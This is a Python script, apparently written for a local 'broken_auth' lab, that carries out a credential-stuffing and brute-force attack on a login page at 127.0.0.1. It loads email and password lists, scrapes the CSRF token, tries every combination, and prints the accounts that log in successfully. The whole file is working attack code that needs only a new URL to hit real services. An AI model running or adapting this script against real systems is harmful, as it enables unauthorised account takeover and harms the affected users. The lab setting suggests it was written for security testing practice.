import requests
from bs4 import BeautifulSoup

# Read emails from email_list.txt
with open("D:/Ace/HaeglTech/broken_auth/assets/email_list.txt", "r") as file:
    email_list = [line.strip() for line in file]

# Read passwords from password_list.txt
with open("D:/Ace/HaeglTech/broken_auth/assets/password_list.txt", "r") as file:
    password_list = [line.strip() for line in file]

# 1️⃣ Credential Stuffing Attack - Brute Force Login
LOGIN_URL = "http://127.0.0.1:8000/login/"
# password_list = ["password123", "admin", "123456", "letmein", "qwerty", "admin123", "admin@123"]
# email = "admin@gmail.com"  # Replace with target email

# Get CSRF token
session = requests.Session()
login_page = session.get(LOGIN_URL)
soup = BeautifulSoup(login_page.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

matched_credentials = []

for email in email_list:
    for password in password_list:
        data = {
            "email": email,
            "password": password,
            "csrfmiddlewaretoken": csrf_token
        }
        response = session.post(LOGIN_URL, data=data, headers={"Referer": LOGIN_URL})
        print(f"Trying {email}:{password} - Response: {response.text}")
        if any(keyword in response.text.lower() for keyword in ["welcome", "successful", "logged in", "hello"]):
            print(f"[+] Success: {email} -> {password}")
            matched_credentials.append((email, password))
            break

# Print summary of matched credentials
print("\nSummary of matched email and password combinations:")
print("S. No.\tEmail \t \t \t Password")
for i, (email, password) in enumerate(matched_credentials, start=1):
    print(f"{i}\t{email} \t {password}")